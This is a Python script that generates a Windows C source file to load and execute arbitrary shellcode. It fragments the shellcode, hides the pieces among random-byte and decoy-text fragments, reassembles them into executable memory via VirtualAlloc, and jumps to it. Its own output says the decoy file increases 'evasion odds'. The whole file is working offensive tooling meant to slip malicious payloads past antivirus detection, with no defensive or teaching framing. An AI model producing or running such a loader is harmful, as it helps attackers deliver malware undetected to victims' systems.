#!/usr/bin/env python3

import argparse
import json
import os
import random
import re

c_header = """#include <stdio.h>
#include <string.h>
#include <windows.h>

int main(int argc, char* argv[]) {
"""

c_footer = """

    memcpy(exec, main, sizeof(main));
    ((void(*)())exec)();

    return 0;
}
"""


# Terminal color variables
class TerminalColor:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Generate obfuscated C source file from shellcode"
    )
    parser.add_argument(
        "-s",
        "--shellcode-file",
        required=True,
        type=argparse.FileType("r"),
        help="Input file with shellcode",
    )
    parser.add_argument(
        "-o",
        "--output",
        default="shell.c",
        help="Output C file (default: shell.c)",
    )
    parser.add_argument(
        "-c",
        "--chunks",
        default=1,
        type=int,
        help="Number of chunks to split the shellcode into",
    )
    parser.add_argument("-df", "--decoy-file", help="Decoy file to be used")
    parser.add_argument(
        "-db",
        "--decoy-bias",
        default=50,
        type=int,
        help="How likely the decoy file will appear as fragments (default: 50 percent)",
    )
    parser.add_argument(
        "-dm",
        "--decoy-multiplier",
        default=5,
        type=int,
        help="Number of decoy fragments compared to real fragments (default: 4 times)",
    )
    parser.add_argument(
        "-min",
        "--min-frag-size",
        default="10",
        type=int,
        help="Min fragment size in bytes (default: 10)",
    )
    parser.add_argument(
        "-max",
        "--max-frag-size",
        default="20",
        type=int,
        help="Max fragment size in bytes (default: 20)",
    )
    parser.add_argument(
        "-fm",
        "--fragment_multiplier",
        default="2",
        type=int,
        help="Fragment length multipler, only affects decoy fragments (default: 2 times)",
    )

    return parser.parse_args()


def read_shellcode(file_object):
    file_content = file_object.read()

    # Speficy regex pattern to match each byte in shellcode file
    hex_pattern = re.compile(r"\\x[0-9a-fA-F]{2}")
    shellcode_bytes = hex_pattern.findall(file_content)

    # Extracting just the hexadecimal part and concatenating them
    shellcode = "".join(shellcode_bytes)

    return shellcode, len(shellcode_bytes)


def split_shellcode(
    shellcode,
    total_length,
    num_chunks,
    min_frag_size,
    max_frag_size,
    fragment_multiplier,
    decoy_multiplier,
    decoy_content,
    decoy_bias,
):
    chunk_size = total_length // num_chunks
    last_chunk_additional_size = total_length % num_chunks
    chunk_info = []
    chunk_index = 0
    total_decoy_size = 0
    total_fragment_count = 0

    for chunk_index in range(num_chunks):
        actual_chunk_size = chunk_size + (
            last_chunk_additional_size if chunk_index == num_chunks - 1 else 0
        )
        start_index = chunk_index * chunk_size * 4
        end_index = start_index + actual_chunk_size * 4

        chunk = shellcode[start_index:end_index]
        dummy_chunk = generate_dummy_bytes(actual_chunk_size)
        chunk_name = f"block{chunk_index}"
        write_file(
            f'\n\n    unsigned char {chunk_name}[{actual_chunk_size}] = "{dummy_chunk}";\n'
        )

        offset = 0
        fragment_info = []

        while offset < len(chunk):
            remaining_size = len(chunk) - offset
            fragment_size = min(
                random.randint(min_frag_size, max_frag_size) * 4, remaining_size
            )

            fragment = chunk[offset : offset + fragment_size]
            offset_byte = offset // 4

            fragment_info.append((fragment, offset_byte))
            offset += fragment_size

        decoy_size, fragment_count = randomize_fragments(
            fragment_info,
            chunk_index,
            min_frag_size,
            max_frag_size,
            fragment_multiplier,
            decoy_multiplier,
            decoy_content,
            decoy_bias,
        )
        chunk_info.append((chunk_name, chunk_size))
        total_decoy_size += decoy_size
        total_fragment_count += fragment_count

    return chunk_info, total_decoy_size, total_fragment_count


def randomize_fragments(
    real_fragments,
    chunk_index,
    min_frag_size,
    max_frag_size,
    fragment_multiplier,
    decoy_multiplier,
    decoy_content,
    decoy_bias,
):
    decoy_fragments = []
    decoy_size = 0
    fragment_count = 0

    for _ in range(len(real_fragments) * decoy_multiplier):
        if decoy_content and random.randint(1, 100) <= decoy_bias:
            # Select a random substring from the decoy content
            start = random.randint(0, len(decoy_content) - 1)
            end = min(
                start
                + random.randint(min_frag_size, max_frag_size)
                * fragment_multiplier
                * 10,
                len(decoy_content),
            )
            decoy_fragment = json.dumps((decoy_content[start:end]))[1:-1]
            frag_type = "ds"
        else:
            decoy_fragment = generate_dummy_bytes(
                random.randint(min_frag_size, max_frag_size) * fragment_multiplier
            )
            frag_type = "db"

        decoy_fragments.append((decoy_fragment, frag_type))

    # Merge real and dummy fragments
    combined_fragments = real_fragments + decoy_fragments
    random.shuffle(combined_fragments)

    label_index = 0
    labelled_real_fragments = []

    # Assign labels and write fragments
    for fragment, frag_type in combined_fragments:
        fragment_count += 1
        label = f"_{chunk_index}{get_label(label_index)}"

        if frag_type == "db":
            write_file(f'    unsigned char {label}[] = "{fragment}";\n')
            decoy_size += len(fragment) // 4
        elif frag_type == "ds":
            write_file(f'    char {label}[] = "{fragment}";\n')
            decoy_size += len(fragment) // 2
        else:
            write_file(f'    unsigned char {label}[] = "{fragment}";\n')
            labelled_real_fragments.append((label, frag_type))

        label_index += 1

    for label, offset in labelled_real_fragments:
        write_file(
            f"    memcpy(block{chunk_index} + {offset}, {label}, sizeof({label}) - 1);\n"
        )

    return decoy_size, fragment_count


def get_label(index):
    label = ""
    while index >= 0:
        label = chr(97 + index % 26) + label
        index = index // 26 - 1
    return label


def generate_dummy_bytes(num_bytes):
    return "".join([f"\\x{random.randint(0, 255):02x}" for _ in range(num_bytes)])


def write_file(file_content):
    with open(output_file, "a") as file:
        file.write(file_content)


def main():
    global output_file
    args = parse_arguments()

    decoy_content = None
    if args.decoy_file:
        with open(args.decoy_file, "r") as file:
            decoy_content = file.read()
    else:
        print(
            f"{TerminalColor.WARNING}Warning: Decoy file not specified, include to increase evasion odds, continuing...{TerminalColor.ENDC}"
        )

    output_file = args.output
    with open(args.output, "w") as _:
        pass

    shellcode, shellcode_length = read_shellcode(args.shellcode_file)

    write_file(c_header)

    dummy_chunk = generate_dummy_bytes(shellcode_length)
    write_file(f'    unsigned char main[] = "{dummy_chunk}";\n\n')

    chunk_info, total_decoy_size, fragment_count = split_shellcode(
        shellcode,
        shellcode_length,
        args.chunks,
        args.min_frag_size,
        args.max_frag_size,
        args.fragment_multiplier,
        args.decoy_multiplier,
        decoy_content,
        args.decoy_bias,
    )

    write_file(
        "\n    void* exec = VirtualAlloc(0, sizeof main, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    )

    # Writing memcpy operations for the main block
    main_offset = 0
    for chunk_name, chunk_size in chunk_info:
        write_file(
            f"    memcpy(main + {main_offset}, {chunk_name}, sizeof({chunk_name}));\n"
        )
        main_offset += chunk_size

    write_file(c_footer)

    final_file_size = os.path.getsize(output_file)
    print(
        f"Shellcode size: {shellcode_length} bytes\nDecoy size: {total_decoy_size} bytes\nFragment count: {fragment_count}\nFile size: {final_file_size} bytes"
    )

    print(f"{TerminalColor.OKGREEN}File saved to {output_file}{TerminalColor.ENDC}")


if __name__ == "__main__":
    main()
